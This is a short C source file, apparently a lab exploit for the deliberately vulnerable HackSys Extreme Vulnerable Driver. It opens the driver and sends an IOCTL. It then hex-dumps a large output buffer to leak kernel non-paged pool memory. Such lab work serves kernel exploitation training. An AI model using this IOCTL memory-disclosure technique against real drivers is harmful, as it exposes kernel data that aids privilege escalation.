#include "exploit.h"

char output[0xFFFF];

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	long long* shellcode_address = 0;
	unsigned long bytes_returned = 0, input_value = 0x12345678;
	char unused = 0;

	RtlSecureZeroMemory(&output, sizeof(output));

	system("title Memory Disclosure");

	printf("%s[!] Exploit written by ExAllocatePool2.\n[!] Lets exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the HackSys Extreme Vulnerable Driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the HackSys Extreme Vulnerable Driver. Handle Value: 0x%p\n[!] Leaking kernel non-paged pool memory...\n", h_driver);

	DeviceIoControl(h_driver, TARGET_IOCTL, &input_value, 8, &output, sizeof(output), &bytes_returned, 0);
	dump_hex(&output, sizeof(output));

	printf("\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}